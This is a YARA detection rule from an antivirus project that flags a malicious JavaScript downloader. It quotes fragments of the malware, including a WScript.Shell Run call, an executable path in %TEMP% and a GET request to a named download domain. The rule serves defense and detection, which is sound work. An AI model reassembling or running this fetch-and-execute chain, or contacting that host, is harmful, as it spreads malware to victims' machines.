rule sig_20160328_133312c5f2b54916b566ad9860d07b61 {
  meta:
    description = "datamaliciousorder - file 20160328_133312c5f2b54916b566ad9860d07b61.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "466b25f98005227d5273de1be6bff00825d81c1f7416927c8ae54334214deb40"

  strings:
    $s1  = "function Uwjbpqmefi() {return Hgacqxu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"zhlqLTapvX72S.exe\";};" fullword ascii
    $s2  = "Olftiyhti[Enjmwbzkvt](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Zybwqlowj](Dzjqsrh() * 11)} while (Olftiyhti[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Chlarja(Mnzjxgko, Kvjqe){return Mnzjxgko - Kvjqe;};" fullword ascii
    $s5  = "var Hgacqxu = function Hkneevd() {return WScript[Xboybjuj](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Deehzweet() {return ((Gxjfwwen == true) && (Gxjfwwen == Ifoey)) ? 1 : Bigjcn;};" fullword ascii
    $s7  = "function Uguws(Grnlmx){Hgacqxu[\"Run\"](Grnlmx, Bigjcn, Bigjcn);};" fullword ascii
    $s8  = "function Bruzxbxnkn(){return Xboybjuj;};" fullword ascii
    $s9  = "var Ifoey = false;" fullword ascii
    $s10 = "return Chlarja(Nbyeahjpd, Jbmbkijgvs);" fullword ascii
    $s11 = "Gxjfwwen = true; " fullword ascii
    $s12 = " while (Uevqkaxpkq){" fullword ascii
    $s13 = "var Gxjfwwen = false;" fullword ascii
    $s14 = "Ifoey = true; " fullword ascii
    $s15 = "function Dzjqsrh(){return 22;};" fullword ascii
    $s16 = "function Vahmdw(Jibotf) {var Zemntsx = (1, 2, 3, 4, 5, Jibotf); return Zemntsx;};" fullword ascii
    $s17 = "var Rtyht = false;" fullword ascii
    $s18 = "var Shlwwog = new this[\"Date\"]();" fullword ascii
    $s19 = "function Ufmmip(){return Ynusdhjb;};" fullword ascii
    $s20 = "function Quzfrg()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}